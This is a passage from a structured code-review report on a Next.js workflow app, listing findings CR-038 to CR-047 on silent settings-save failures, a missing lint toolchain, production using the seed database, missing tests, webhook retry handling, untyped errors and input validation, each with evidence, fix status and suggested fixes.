- **Re-verification note:** `useLiveTasks` still never returns `query.isError`/`query.error`; only `staleError` (payload.error) and the force-refresh mutation error reach `TasksView`, so a 502/500 with no cached data renders "No tasks match the current filters" with no banner or Retry. Return `queryError: query.error?.message`, fold it into `error` in TasksView, and keep rows visible on background failures.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-03
- **Location:** `components/tasks/hooks/use-live-tasks.ts:35-39,52-69`, `components/tasks/TasksView.tsx:111,141-148`
- **Problem:** `/api/tasks/live` returns 502 when the provider fails with no cache entry (and 500 when no provider is registered). `fetchJson` throws, but the hook never reads `query.isError` / `query.error`. It only surfaces `payload.error` (the stale-serve case) and the force-refresh mutation error. With `keepPreviousData` and no prior data, the result is `tasks: []`, no banner, and the empty message "No tasks match the current filters". The user assumes there is no work rather than an outage, and there's no Retry button.
- **Evidence:**
  ```ts
  const staleError = typeof query.data?.error === "string" ? query.data.error : undefined;
  return { tasks: query.data?.tasks ?? [], ..., staleError,
    refreshError: refresh.error?.message, forceRefresh };
  // TasksView
  const error = staleError ?? refreshError ?? null;
  ```
- **Suggested fix:** Return `queryError: query.error?.message` from the hook and include it in `error` in `TasksView`, so the existing destructive Alert and Retry render. Keep previous rows visible on a background failure (`isError && data`), and show the error empty state only when there's no data.
- **Effort:** S

### CR-038 [High] `saveSettings` silently drops failed PATCHes; local-agent toggles (sandbox / --force) fail without feedback

- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
- **Current location:** components/settings/context.tsx:81-92, components/settings/integrations/hooks/use-local-agent-options.ts:17-32
- **Re-verification note:** `saveSettings` still returns silently on `!res.ok`, and `useLocalAgentOptions` fires it with `void ….finally()`, so a failed Sandbox/--force toggle gives no feedback (network errors become unhandled rejections). Delete `saveSettings` from the context, use `usePatchSettings()` in the hook (derive in-flight field from `mutation.variables`/`isPending`), and thread the tab's `onError` into the mutation.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-04
- **Related:** CR-027 (FLOWUI-02); CR-036 (UI-02)
- **Location:** `components/settings/context.tsx:81-92`, `components/settings/integrations/hooks/use-local-agent-options.ts:23-31`
- **Problem:** `saveSettings` returns normally on `!res.ok`, so a 400 or 500 looks like success. A network error rejects, `use-local-agent-options` discards the promise with `void … .finally()`, and the result is an unhandled rejection with no UI message. The **Sandbox** and **Auto-approve (--force)** toggles are security-relevant; a failed save leaves the user believing the sandbox is on. `saveSettings` also duplicates `patchSettings` / `usePatchSettings` (`queries.ts:40-47`, `general/hooks/use-patch-settings.ts`) and hand-rolls pending state (`savingField`) that `useMutation` already provides.
- **Evidence:**
  ```ts
  const res = await fetch("/api/settings", { method: "PATCH", ... });
  if (!res.ok) return;
  await queryClient.invalidateQueries({ queryKey: queryKeys.settings });
  // use-local-agent-options.ts
  void saveSettings({ [LOCAL_AGENT.KEY]: { [field]: !options[field] } })
    .finally(() => setSavingField(null));
  ```
- **Suggested fix:** Delete `saveSettings` from the context. In `useLocalAgentOptions`, use `usePatchSettings()` and derive the in-flight field from `mutation.variables` / `isPending`. Pass an `onError` (thread the tab's `onError` prop) so failures reach the page alert.
- **Effort:** S

### CR-039 [High] Lint toolchain is not installed (eslint deps missing from the lockfile), so `npm run lint` cannot run and no AGENTS.md §5 rule is enforced

- **Status at `abaa007`:** **Fixed**
- **Re-verification note:** The lockfile now includes eslint/eslint-config-next/@eslint/eslintrc, `node_modules/.bin/eslint` is installed, and `npm run lint` runs (0 errors, 143 warnings). Residuals tracked elsewhere: `next.config.mjs:9` still has `eslint.ignoreDuringBuilds: true` and `lib/`+`scripts/` rules are downgraded to warn in `eslint.config.mjs`.

- **Severity:** High
- **Category:** Boundaries (sources: TOOL-01: Boundaries; NODE-44: Code quality)
- **Area:** Area 7b — Tooling & config; Area 3 — Engine nodes
- **Source:** TOOL-01, NODE-44 (merged duplicate)
- **Related:** CR-061 (ENG-16); CR-161 (FLOWUI-16, UI-27, TOOL-08); CR-162 (TOOL-09); CR-163 (TPL-23, TOOL-10); CR-165 (TOOL-12); CR-166 (UI-18, TOOL-13); CR-170 (APP-23); CR-182 (ENG-33); CR-183 (ENG-34); CR-202 (NODE-35); CR-213 (DATA-33); CR-257 (TOOL-14)
- **Location:**
  - TOOL-01: `package.json:55-64`, `package-lock.json:45-51`, `next.config.mjs:9`
  - NODE-44: `eslint.config.mjs` (tooling; affects `lib/engine/nodes/**`)
- **Suggested fix (combined):** Run `npm install` with network access so `package-lock.json` picks up `eslint`, `eslint-config-next` and `@eslint/eslintrc`, commit the lockfile, then run `npm run lint` once and triage. This is a prerequisite for every lint-enforcement item; NODE-44's per-area impact (unenforced `any`/`!`/restricted-paths in `lib/engine/nodes/**`) disappears once the toolchain runs.
- **Effort:** S (sources: TOOL-01 S, NODE-44 S)

Original findings, verbatim:

#### TOOL-01 (Area 7b — Tooling & config): Lint toolchain is not installable: eslint deps are missing from the lockfile, so `npm run lint` cannot run

- **Severity:** High
- **Category:** Boundaries
- **Location:** `package.json:55-64`, `package-lock.json:45-51`, `next.config.mjs:9`
- **Problem:** Commit `e10f666 "chore: Add lint in dep"` added `@eslint/eslintrc`, `eslint` and `eslint-config-next` to `package.json` without updating `package-lock.json`. The lockfile has zero occurrences of "eslint". `npm ci` will either error (lock out of sync) or skip them, and in the current checkout none of them is installed. The result is that every rule in AGENTS.md §5 is unenforced. `npm run lint` fails with exit 127, and the build skips lint (`ignoreDuringBuilds: true`), so neither gate runs.
- **Evidence:**
  ```
  $ npm run lint      -> sh: eslint: command not found (exit 127)
  $ rg -c eslint package-lock.json   -> (no matches)
  $ npm ls eslint     -> └── (empty)
  $ git show e10f666 --stat -> package.json | 3 +++   (lockfile untouched)
  ```
- **Suggested fix:** Run `npm install` with network access so the lockfile picks up the three devDeps, then commit `package-lock.json`. Run `npm run lint` once and triage the output; it has never run on this tree since the deps were added. Optionally add a CI or pre-push step `npm ci && npm run lint`.
- **Effort:** S

#### NODE-44 (Area 3 — Engine nodes): `npm run lint` crashes, so none of the §5 lint rules protect this area

- **Severity:** Low
- **Category:** Code quality
- **Location:** `eslint.config.mjs` (tooling; affects `lib/engine/nodes/**`)
- **Problem:** `npx eslint lib/engine/nodes` fails with `ERR_MODULE_NOT_FOUND: Cannot find package '@eslint/eslintrc'`. The `no-explicit-any`, `no-non-null-assertion` and restricted-paths rules don't run, which is why NODE-35 (CR-202)'s violations exist. (The config file sits outside this area; it's listed because the impact here is direct.)
- **Evidence:** `Error [ERR_MODULE_NOT_FOUND]: Cannot find package '@eslint/eslintrc' imported from /Users/mihir.shah/ship/eslint.config.mjs`
- **Suggested fix:** Install the missing dev dependency or migrate the config to flat-config-native imports (with approval), then fix the violations it reports.
- **Effort:** S

### CR-040 [High] `.env.example` sets `DATABASE_PATH`, which defeats the production-DB separation, so `next start` uses the demo/seed DB

- **Status at `abaa007`:** **Fixed** (Task 06 — commented `DATABASE_PATH` in `.env.example`, README setup note, `init-prod-db` warning)
- **Current location:** .env.example:2, lib/config.ts:28-46, scripts/init-prod-db.mjs:16, README.md:50, README.md:227-228
- **Re-verification note:** `.env.example` still sets `DATABASE_PATH=./data/devflow.db` and README still says `cp .env.example .env`, so `DatabaseConfig.path()` never takes the `devflow.prod.db` branch under `next start` and production shares the seed/demo DB; `db:init:prod` creates a file the server then ignores. Comment out `DATABASE_PATH` in `.env.example` (or split `DEMO_DATABASE_PATH`/`DATABASE_PATH`) and have `init-prod-db.mjs` warn when `DATABASE_PATH` is set.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-02
- **Related:** CR-157 (TOOL-04)
- **Location:** `.env.example:2`, `lib/config.ts:44-49`, `scripts/init-prod-db.mjs:16`, `README.md:50`, `README.md:217-219`
- **Problem:** `DatabaseConfig.path()` uses `data/devflow.prod.db` only when `DATABASE_PATH` is unset and `NODE_ENV=production`. README Setup says `cp .env.example .env`, and `.env.example` sets `DATABASE_PATH=./data/devflow.db`. Next loads `.env` in production too (the build log shows "Environments: .env"). So in production the app opens `devflow.db`, the same file every `seed:*` script writes mock data to. Meanwhile `db:init:prod` creates `devflow.prod.db`, which the server never uses. The local `.env` currently has exactly this value. This breaks the safety intent of AGENTS.md §1 and the README guarantee that "seed scripts refuse to touch" the prod DB.
- **Evidence:**
  ```
  .env.example:2   DATABASE_PATH=./data/devflow.db
  lib/config.ts:45 if (!AppConfig.env("DATABASE_PATH") && process.env.NODE_ENV === "production") {
  lib/config.ts:46   return path.resolve(AppConfig.root, "./data/devflow.prod.db");
  .env:2           DATABASE_PATH=./data/devflow.db
  build log:       - Environments: .env
  ```
- **Suggested fix:** Comment out `DATABASE_PATH` in `.env.example` (`# DATABASE_PATH=./data/devflow.db  # optional override; prod defaults to data/devflow.prod.db`). Better still, use separate `DEMO_DATABASE_PATH` and `DATABASE_PATH` variables so the seed target and the app DB can never alias. Have `init-prod-db.mjs` print a warning when `DATABASE_PATH` is set, because the server would then ignore the file it just created.
- **Effort:** S

### CR-041 [High] No test runner and no tests anywhere, although the Definition of Done requires tests for service classes and row mappers

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 05](review-tasks/05-test-coverage-baseline.md)
- **Current severity:** Medium (was High)
- **Current location:** lib/db/rows.ts, lib/engine/templates/template-yaml.ts, lib/engine/templates/template-lint.ts, lib/engine/nodes/kinds/start/contract.ts, lib/git/worktrees.ts, lib/git/dep-policy.ts, lib/integrations/gitlab/git-host.ts, lib/net/ssrf-guard.ts, tests/plan-diff.test.ts
- **Re-verification note:** vitest, `vitest.config.mts` (server-only stub + `@` alias), the `test` script and 23 test files now exist (plan node/store/contract, split, agent output errors, a DB column-migration test). Still missing: tests for the `lib/db/rows.ts` mappers, `parseTemplateYaml` + an import-every-`docs/flow-templates/*.yaml` test, template-lint, start-contract coercion, and the git/dep-policy/GitLab/SSRF helpers; `tsc --noEmit` also fails in `tests/plan-diff.test.ts`, which vitest does not type-check.

- **Severity:** High
- **Category:** Code quality
- **Area:** Area 7b — Tooling & config; Area 4 — DB, git, integrations; Area 3 — Engine nodes
- **Source:** TOOL-03, DATA-25, NODE-43 (merged duplicate)
- **Related:** CR-079 (NODE-13); CR-160 (TOOL-07); CR-164 (TOOL-11); CR-165 (TOOL-12); CR-262 (TOOL-19)
- **Location:**
  - TOOL-03: `package.json:5-19` (no `test` script), `AGENTS.md:27`, `lib/db/rows.ts:409-429`
  - DATA-25: `lib/db/rows.ts:1-429`, `lib/db/index.ts:73-829`, `lib/git/worktrees.ts:104-145`, `lib/git/dep-policy.ts:59-79`, `lib/integrations/gitlab/git-host.ts:27-71`
  - NODE-43: `lib/engine/nodes/plan/plan-node.ts:153-246`, `lib/engine/nodes/plan/schema.ts:134-238`, `lib/engine/nodes/plan/plan-meta-parser.ts:24-71`, `lib/engine/nodes/agent/json-schema-lite.ts:11-130`, `lib/engine/nodes/start/contract.ts:111-166`, `lib/engine/nodes/base/tool-pairer.ts:22-56`, `lib/engine/nodes/base/stream-buffer.ts:9-54`, `lib/engine/nodes/base/usage-tracker.ts:43-55`
- **Suggested fix (combined):** One PR: get approval for a single runner devDependency (TOOL-03 proposes `vitest`; DATA-25/NODE-43 mention `node:test` + `tsx` as the zero-runner alternative), add the config, `server-only` stub, temp-file DB helper and `test` script. Seed it with the highest-value pure targets named by all three reviewers: `lib/db/rows.ts` mappers and the migration chain (DATA-25), plan merge/diff/validators, `extractJson`/`validateJsonSchema`, `jsonataTruthy` (NODE-43), `parseTemplateYaml`, `context-lint` and an import-every-fixture test (TOOL-03). Area-specific test backfill can then be separate follow-up PRs.
- **Effort:** M (sources: TOOL-03 M, DATA-25 M, NODE-43 M)

Original findings, verbatim:

#### TOOL-03 (Area 7b — Tooling & config): No test infrastructure, although the Definition of Done requires tests for service classes and row mappers

- **Severity:** High
- **Category:** Code quality
- **Location:** `package.json:5-19` (no `test` script), `AGENTS.md:27`, `lib/db/rows.ts:409-429`
- **Problem:** The repo has no `*.test.*`, `*.spec.*` or `__tests__` files and no `test` script. The only regression checks are the ad-hoc `scripts/check-*.ts`, and those are unrunnable (TOOL-07 (CR-160)). So the DoD item "New service classes and row mappers have tests" can't be met by anyone. Row mappers (`RowGateway` with Zod row schemas) and pure services (`PlanMetaParser`, `context-lint`, `templates-yaml` parse) are ideal unit-test targets and currently have no coverage.
- **Evidence:**
  ```
  $ rg --files -g '*.test.*' -g '*.spec.*' -g '**/__tests__/**' --glob '!node_modules'  -> (none)
  $ rg -n '"test"' package.json  -> (none)
  ```
- **Suggested fix:** Minimal proposal, needs approval for one new devDependency:
  1. Add **`vitest`** as a devDep. It handles TypeScript, the `@/` alias (via `resolve.alias`) and extensionless imports without a build step.
  2. Add `vitest.config.ts` with `resolve.alias: { "@": root, "server-only": "<root>/test/stubs/empty.ts" }`. `server-only` is only aliased inside Next's bundler (see TOOL-12 (CR-165)).
  3. Add a `"test": "vitest run"` script, plus a `test/helpers/db.ts` that sets `DATABASE_PATH` to an `fs.mkdtempSync` file before importing `lib/db`, the same pattern `check-worktrees.ts:407` uses. `:memory:` won't work because `config.db.path()` runs `path.resolve` on it.
  4. Start with `lib/db/rows.ts` mappers, `lib/engine/templates-yaml.ts#parseTemplateYaml`, `lib/engine/context-lint.ts`, and a test that imports every `docs/flow-templates/*.yaml` (catches TOOL-11 (CR-164)).
  5. Port `scripts/check-*.ts` assertions into `*.test.ts`.

  A zero-runner alternative is `tsx` plus `node --test`, which still needs `tsx` as a devDep and a `server-only` stub via `--conditions=react-server` or an alias.
- **Effort:** M

#### DATA-25 (Area 4 — DB, git, integrations): No tests for row mappers, migrations or any service in the area

- **Severity:** Medium
- **Category:** Code quality
- **Location:** `lib/db/rows.ts:1-429`, `lib/db/index.ts:73-829`, `lib/git/worktrees.ts:104-145`, `lib/git/dep-policy.ts:59-79`, `lib/integrations/gitlab/git-host.ts:27-71`
- **Problem:** The repo contains no `*.test.*` or `*.spec.*` files and no test script in `package.json`. AGENTS.md section 0 requires tests for new service classes and row mappers. High-value pure units with no coverage include `jsonCol`/`Task` transforms, the migration chain run against a fixture legacy DB, `parseWorktreeList`, `sanitizeWorktreeName`, `isDangerousWorktreeRemovalPath`, `globToRegExp`/`expandSyncPaths`, `DepPolicyResolver.resolve`, the GitLab mappers and `parseWebhook`.
- **Evidence:**
  ```json
  "scripts": { "dev": "next dev", "build": "next build", "start": "next start", "lint": "eslint .", ... }
  ```
- **Suggested fix:** Ask before adding a runner, since that is a new dependency. Node's built-in `node:test` with `tsx` may already be available. Start with row-mapper and migration tests on an in-memory DB, then the pure git and dep-policy helpers.
- **Effort:** M

#### NODE-43 (Area 3 — Engine nodes): There are no tests for the pure logic in this area

- **Severity:** Low
- **Category:** Code quality
- **Location:** `lib/engine/nodes/plan/plan-node.ts:153-246`, `lib/engine/nodes/plan/schema.ts:134-238`, `lib/engine/nodes/plan/plan-meta-parser.ts:24-71`, `lib/engine/nodes/agent/json-schema-lite.ts:11-130`, `lib/engine/nodes/start/contract.ts:111-166`, `lib/engine/nodes/base/tool-pairer.ts:22-56`, `lib/engine/nodes/base/stream-buffer.ts:9-54`, `lib/engine/nodes/base/usage-tracker.ts:43-55`
- **Problem:** No `*.test.ts` files exist in the repo. The Definition of Done requires tests for service classes and mappers. The deterministic, high-risk logic here has no coverage at all: the plan merge, diff and validators, the JSON extraction and schema checks, start-contract coercion, tool pairing, stream capping and cost estimation. Several bugs above (NODE-13 (CR-079), -14, -31, -38) would have been caught.
- **Evidence:** `rg --files | rg -i "(test|spec)\.(ts|tsx)$"` → no matches.
- **Suggested fix:** Add a test runner (this needs approval under the "no new dependencies" rule). Start with table-driven tests for `mergeBranchRefine`, `diffBranchSteps`, `validateComplexPlan`, `extractJson`/`validateJsonSchema`, `validateAgainstContract` and `jsonataTruthy`.
- **Effort:** M

## Findings: Medium (125)

### CR-042 [Medium] `update_plan_steps` with no `steps` field deletes the whole plan checklist

- **Status at `abaa007`:** **Fixed** (Task 10 — `flowActionBodySchema` requires `steps`; route no longer coerces with `?? []`)
- **Current location:** app/api/flows/[id]/action/route.ts:38, lib/engine/flow-engine.ts:802-834
- **Re-verification note:** `update_plan_steps` still maps a missing `steps` to `[]`; `updatePlanSteps` now refuses removing steps with active/merged children, but every other (deletable) step is silently wiped. Validate `steps` as a required array at the route boundary (Zod, like `splitUnitBody`) and drop the `?? []`; review `config ?? {}` / `chosen ?? []` too.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-06
- **Related:** CR-003 (APP-03) — fix CR-003 first: reuse the shared Zod body parser
- **Location:** `app/api/flows/[id]/action/route.ts:41`
- **Problem:** The route turns a missing `steps` into `[]`. `flowEngine.updatePlanSteps` treats every existing row that was not sent as removed and calls `planSteps.replace(flowId, …, [])` (`lib/engine/flow.ts:685-702`). So a buggy or malformed client call such as `{action:"update_plan_steps"}` silently clears the checklist instead of returning a 400.
- **Evidence:**
  ```ts
  update_plan_steps: (id, b) => flowEngine.updatePlanSteps(id, b.steps ?? []),
  ```
- **Suggested fix:** Require `steps` to be an array, enforced by the APP-03 (CR-003) schema or `if (!Array.isArray(b.steps)) throw …`. Review the other `?? default` coercions in this map too: `feedback ?? ""`, `chosen ?? []` and `config ?? {}`.
- **Effort:** S

### CR-043 [Medium] The generic webhook records a delivery as seen before dispatching it, so failed deliveries are lost on retry

- **Status at `abaa007`:** **Fixed** ([Task 29](review-tasks/29-webhook-reliability.md))
- **Current location:** app/api/hooks/[id]/route.ts:43-46,53-79, lib/engine/runtime/hook-store.ts:150-171
- **Re-verification note:** `deliverySeen` still inserts the `webhook-id` before the JSONata filter and dispatch, so a delivery whose filter evaluation or `startFromTemplate`/`resumeNodeFromWebhook` fails is answered `{dedup:true}` on retry and never processed. Split into `isSeen`/`markSeen` and mark only after successful dispatch or a deliberate filter drop.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-07
- **Location:** `app/api/hooks/[id]/route.ts:43-46`, `app/api/hooks/[id]/route.ts:65-79`
- **Problem:** `hookStore.deliverySeen` inserts the `webhook-id` the first time it sees it (`lib/engine/hooks.ts:161-169`). The route calls it before the JSONata filter and before `startFromTemplate`/`resumeNodeFromWebhook`. If dispatch then throws, the route returns a 400 (or the filter evaluation fails), and the sender retries with the same `webhook-id`, as the Standard Webhooks spec says it should. The retry gets `{ok:true, dedup:true}` and the event is never processed.
- **Evidence:**
  ```ts
  if (webhookId && hookStore.deliverySeen(hook.id, webhookId)) {
    return NextResponse.json({ ok: true, dedup: true });
  }
  ... // filter + dispatch may still fail below
  ```
- **Suggested fix:** Split the store call into `isSeen()` and `markSeen()`, and call `markSeen()` only after a successful dispatch or a deliberate filter-drop. Alternatively, delete the record in the catch block. Move the whole receive flow into a `HookReceiver` service so the route stays thin.
- **Effort:** S

### CR-044 [Medium] The GitLab webhook parses the body before auth and has no error handling around engine calls

- **Status at `abaa007`:** **Fixed** ([Task 29](review-tasks/29-webhook-reliability.md))
- **Current location:** app/api/webhooks/gitlab/route.ts:8-10,27-30,37-74, lib/engine/nodes/chains/sdlc-chain.ts:142-145
- **Re-verification note:** The route still does `await req.json()` before `verifyWebhook`, has no try/catch around `ingestComments`/`emitEvent`/`triggerPipelineGate` (which throws "no pipeline gate node" for gate-less templates → 500 → GitLab retries/disables the hook), and keeps the duplicate `flowScheduleFallback`. Verify first, parse with `.catch(() => null)` → 400, move handling into a `flowEngine.handleHostEvent(event)` and log domain errors while returning 200.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-08
- **Related:** CR-046 (APP-10, ENG-28); CR-069 (ENG-24, DATA-08)
- **Location:** `app/api/webhooks/gitlab/route.ts:24-76`
- **Problem:**
  1. `await req.json()` (line 27) runs before `verifyWebhook` (line 28), so unauthenticated junk gets a 500 instead of a 401.
  2. Nothing in the handler is wrapped in try/catch. `flowEngine.triggerPipelineGate` throws `"this flow template has no pipeline gate node"` (`lib/engine/nodes/sdlc/chain.ts:142`) when a pipeline-failed event arrives for a flow whose template has no gate. `ingestComments`, `emitEvent` and the others can throw too. GitLab sees a 500, retries, and after repeated failures disables the webhook for the whole project.
  3. `flowScheduleFallback` (lines 8-10) duplicates the formatting in `flowEngine.resolveScheduleClock` (`lib/engine/flow.ts:1226-1229`).
- **Evidence:**
  ```ts
  const payload = await req.json();
  if (!host.verifyWebhook(req.headers)) { ... 401 }
  ...
  if (event.pipeline.status === "failed") flowEngine.triggerPipelineGate(f.id, event.pipeline.id);
  ```
- **Suggested fix:** Verify first, then parse with `req.json().catch(() => null)` and return a 400 on failure. Move the comment and pipeline handling into an engine method such as `flowEngine.handleHostEvent(event)`. Wrap the call so expected domain errors are logged and the route returns 200 to stop GitLab retrying. Remove `flowScheduleFallback`.
- **Effort:** S

### CR-045 [Medium] GET handlers and server loaders start the poller and run the reconciler as side effects

- **Status at `abaa007`:** **Fixed** ([Task 25](review-tasks/25-wait-timers-and-poller.md))
- **Current location:** app/api/flows/route.ts:8,13, app/api/flows/[id]/route.ts:9,14, app/api/flows/[id]/events/route.ts:11, loaders/flows.ts:25,28,42, app/api/hooks/[id]/route.ts:63, app/api/webhooks/gitlab/route.ts:33
- **Re-verification note:** GET handlers and loaders still call `flowPoller.start()` and fire `reconciler.reconcileFlow(id)` (for any id, every 3 s from the events poll) with errors swallowed by `.catch(() => {})`; there is still no `instrumentation.ts`. Start the poller once from `instrumentation.ts` `register()`, move reconcile onto the poller tick or an explicit POST, and log reconcile failures.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-09
- **Related:** CR-006 (ENG-01); CR-060 (ENG-15)
- **Location:** `app/api/flows/route.ts:7-8,13-14`, `app/api/flows/[id]/route.ts:9,14`, `app/api/flows/[id]/events/route.ts:11`, `loaders/flows.ts:25-28,42`, `app/api/hooks/[id]/route.ts:63`, `app/api/webhooks/gitlab/route.ts:33`
- **Problem:** Read endpoints have write side effects. `reconciler.reconcileFlow(id)` changes node state and emits events, and it fires for any id, including unknown ones (events GET). The events GET is polled every 3 s per open cockpit, so polling, link prefetching and server rendering all trigger reconciles. The background poller only starts once someone happens to hit one of these routes, so its lifecycle is tied to traffic: after a restart, nothing polls until a page is opened. The errors are swallowed (`.catch(() => {})`), so reconcile failures are invisible.
- **Evidence:**
  ```ts
  export async function GET() {
    flowPoller.start();
    return NextResponse.json({ flows: flowEngine.list() });
  }
  ```
- **Suggested fix:** Start the poller once from `instrumentation.ts` (`register()` with the Node runtime). Move reconcile onto the poller tick, or onto an explicit `POST /api/flows/:id/reconcile` for open cockpits. At minimum, log reconcile errors instead of dropping them. Remove the calls from the loaders and GET routes.
- **Effort:** M

### CR-046 [Medium] No typed error classes: the engine throws bare `Error`, so routes map almost everything to 400 (or leak an unhandled 500)

- **Status at `abaa007`:** **Fixed** in [Task 09](review-tasks/09-typed-errors.md) — `lib/errors.ts` + `toErrorResponse`, typed throws in `flow-engine`, `template-store`, GitLab host adapter; route handlers wired to the mapper (including host-instances, settings PATCH, GitLab webhook).
- **Current location:** app/api/flows/[id]/action/route.ts:124-130, app/api/flows/[id]/chat/route.ts:27-29, app/api/templates/[id]/route.ts:72-77,132-134, app/api/hooks/[id]/route.ts:77-79, app/api/host-instances/[host]/[id]/route.ts:6-36, app/api/settings/route.ts, app/api/webhooks/gitlab/route.ts, lib/engine/flow-engine.ts:548,574,1667, lib/integrations/gitlab/git-host.ts:223,238
- **Re-verification note:** Still no `NotFoundError`/`ConflictError`/`ValidationError`; the engine throws bare `Error` ("flow not found", "already running", "host instance not found") and routes map everything to 400 or leak an unhandled 500 (host-instances, settings, gitlab webhook). The action route's new `httpStatus` duck-typing is dead code (nothing in `lib/` sets it). Add a shared errors module + `toErrorResponse(e)` helper and use it across routes.

- **Severity:** Medium
- **Category:** Correctness (sources: APP-10: Correctness; ENG-28: Boundaries)
- **Area:** Area 1 — App/API (app/, loaders/); Area 2 — Engine core & shared lib
- **Source:** APP-10, ENG-28 (merged duplicate)
- **Related:** CR-021 (DATA-01); CR-044 (APP-08); CR-055 (ENG-10); CR-099 (DATA-07); CR-114 (APP-12, DATA-23)
- **Location:**
  - APP-10: - Catch-all 400: `app/api/flows/route.ts:21-23`, `app/api/flows/[id]/route.ts:22-28`, `app/api/flows/[id]/action/route.ts:83-85`, `app/api/flows/[id]/chat/route.ts:20-22`, `app/api/node-templates/route.ts:59-61`, `app/api/node-templates/[id]/route.ts:29-31,40-42`, `app/api/templates/route.ts:31-33`, `app/api/templates/[id]/route.ts:72-77,132-134`, `app/api/templates/import/route.ts:18-20`, `app/api/hooks/[id]/route.ts:77-79`, `app/api/task-instances/**`
      - Catch-all 404: `app/api/templates/[id]/export/route.ts:27-29`
      - No try/catch: `app/api/host-instances/[host]/[id]/route.ts:6-36`, `app/api/repos/**`, `app/api/settings/route.ts`, `app/api/tasks/**`, `app/api/webhooks/gitlab/route.ts`
  - ENG-28: `lib/engine/flow.ts:91`, `lib/engine/flow.ts:455`, `lib/engine/flow.ts:481`, `lib/engine/flow.ts:652`, `lib/engine/flow.ts:1280-1283`, `lib/engine/flow.ts:1459-1463`, `lib/engine/step-flows.ts:930-931`, `lib/engine/templates.ts:471-534`, `app/api/flows/[id]/action/route.ts:83-85`
- **Suggested fix (combined):** Add `NotFoundError`, `ValidationError` and `ConflictError` (one shared errors module, e.g. `lib/errors/`), throw them from engine services in place of the bare `Error`s ENG-28 lists, and add one `toErrorResponse(e)` route helper that maps them to 404/400/409 and everything else to a logged, generic 500. Use the helper in every route listed by APP-10 (including the routes with no try/catch).
- **Effort:** M (sources: APP-10 M, ENG-28 M)

Original findings, verbatim:

#### APP-10 (Area 1 — App/API (app/, loaders/)): Errors map to the wrong HTTP statuses, and some routes have no error handling at all

- **Severity:** Medium
- **Category:** Correctness
- **Location:**
  - Catch-all 400: `app/api/flows/route.ts:21-23`, `app/api/flows/[id]/route.ts:22-28`, `app/api/flows/[id]/action/route.ts:83-85`, `app/api/flows/[id]/chat/route.ts:20-22`, `app/api/node-templates/route.ts:59-61`, `app/api/node-templates/[id]/route.ts:29-31,40-42`, `app/api/templates/route.ts:31-33`, `app/api/templates/[id]/route.ts:72-77,132-134`, `app/api/templates/import/route.ts:18-20`, `app/api/hooks/[id]/route.ts:77-79`, `app/api/task-instances/**`
  - Catch-all 404: `app/api/templates/[id]/export/route.ts:27-29`
  - No try/catch: `app/api/host-instances/[host]/[id]/route.ts:6-36`, `app/api/repos/**`, `app/api/settings/route.ts`, `app/api/tasks/**`, `app/api/webhooks/gitlab/route.ts`
- **Problem:** There are no typed error classes (§3.2), so routes cannot tell the cases apart:
  - `DELETE /api/flows/:id` for a missing flow returns 400 instead of 404 (`flow.ts:455`).
  - Internal failures (SQLite, git, SDK) come back as 400 "client errors", with raw internal messages.
  - Export turns a serializer bug into a "404".
  - The git-host PATCH and test routes throw `host instance not found`, which becomes an unhandled 500. The task-instance routes wrap the identical call and return 400, so the two route families behave differently.
- **Evidence:**
  ```ts
  } catch (e: unknown) {
    return NextResponse.json({ error: e instanceof Error ? e.message : String(e) }, { status: 400 });
  }
  ```
- **Suggested fix:** Add `NotFoundError`, `ValidationError` and `ConflictError` in `lib/errors/`, and throw them from the services. Add one `toErrorResponse(e)` helper that maps them to 404/400/409 and anything else to 500 with a generic message plus a server-side log. Use the helper in every route.
- **Effort:** M

#### ENG-28 (Area 2 — Engine core & shared lib): Engine throws untyped `Error` everywhere, so routes cannot distinguish 404, 409 and 400

- **Severity:** Medium
- **Category:** Boundaries
- **Location:** `lib/engine/flow.ts:91`, `lib/engine/flow.ts:455`, `lib/engine/flow.ts:481`, `lib/engine/flow.ts:652`, `lib/engine/flow.ts:1280-1283`, `lib/engine/flow.ts:1459-1463`, `lib/engine/step-flows.ts:930-931`, `lib/engine/templates.ts:471-534`, `app/api/flows/[id]/action/route.ts:83-85`
- **Problem:** AGENTS.md section 3.2 requires typed error classes that routes map to HTTP. Every "not found", "already running" and "not editable" case is a bare `new Error(string)`, so the action route returns 400 for all of them. Clients cannot tell "retry later" (409) from "bad input" (400) or "gone" (404). Only `YamlTemplateError` and `SsrfError` are typed.
- **Evidence:**
  ```ts
  if (!flow) throw new Error("flow not found");
  ...
  if (node.status === "running") throw new Error(`${nodeKey} is already running`);
  ```
- **Suggested fix:** Add `NotFoundError`, `ConflictError` and `ValidationError` in `lib/engine/errors.ts` (one class per file, or a small errors module). Throw them from engine services, and map them in a shared route helper.
- **Effort:** M

### CR-047 [Medium] The events endpoint does not validate `limit`

- **Status at `abaa007`:** **Fixed** (Task 10 — `parseQuery` + `db.listEvents`)
- **Current location:** app/api/flows/[id]/events/route.ts:14-18
- **Re-verification note:** `limit` is still `Number(searchParams.get("limit") ?? 200)` passed straight to SQLite: `?limit=abc` → NaN → 500, `?limit=-1` → unbounded event dump. Parse with `z.coerce.number().int().min(1).max(500).default(200)` and move the query into a `db.listEvents(flowId, after, limit)` method.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-11
- **Related:** CR-003 (APP-03) — fix CR-003 first: reuse the shared Zod query parsing; CR-051 (APP-16); CR-108 (APP-19, DATA-17)
- **Location:** `app/api/flows/[id]/events/route.ts:14-18`
